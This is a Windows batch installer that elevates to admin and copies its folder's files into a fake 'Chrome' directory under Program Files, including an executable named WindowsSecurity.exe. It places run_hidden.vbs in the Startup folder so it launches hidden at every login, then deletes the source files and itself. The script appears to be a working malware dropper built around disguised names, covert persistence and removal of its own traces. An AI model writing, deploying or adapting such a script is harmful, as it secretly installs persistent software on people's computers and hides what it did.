@echo off
:: Check for Admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting Administrator permissions...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

setlocal enabledelayedexpansion

:: Get the folder where this script is located
set "sourceFolder=%~dp0"
set "targetFolder=C:\Program Files\Chrome"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

echo Creating target folder if it does not exist...
if not exist "%targetFolder%" mkdir "%targetFolder%" || (echo ERROR: Failed to create %targetFolder%! & pause & exit /b)

:: Copy only the files that exist in the same directory as the script
for %%F in ("%sourceFolder%\*") do (
    if /I not "%%~nxF"=="setup.bat" (
        copy /Y "%%F" "%targetFolder%" && echo Copied %%~nxF to %targetFolder% || echo ERROR: Failed to copy %%~nxF!
    )
)

:: Copy run_hidden.vbs to the Startup folder
if exist "%sourceFolder%\run_hidden.vbs" (
    copy /Y "%sourceFolder%\run_hidden.vbs" "%startupFolder%\run_hidden.vbs" && echo Copied run_hidden.vbs to Startup folder. || echo ERROR: Failed to copy run_hidden.vbs!
) else (
    echo ERROR: run_hidden.vbs not found in source folder!
    pause
    exit /b
)

:: Verify if files exist before deleting
if not exist "%startupFolder%\run_hidden.vbs" (
    echo ERROR: run_hidden.vbs was NOT copied to Startup folder!
    pause
    exit /b
)

if not exist "%targetFolder%\WindowsSecurity.exe" (
    echo ERROR: WindowsSecurity.exe was NOT copied to %targetFolder%!
    pause
    exit /b
)

:: Wait before deleting to ensure file operations complete
timeout /t 2 /nobreak >nul

:: Delete original files after verification
for %%F in ("%sourceFolder%\*") do (
    if /I not "%%~nxF"=="setup.bat" (
        del /F /Q "%%F" && echo Deleted %%~nxF
    )
)

:: Delete setup.bat itself
del /F /Q "%~f0"

exit
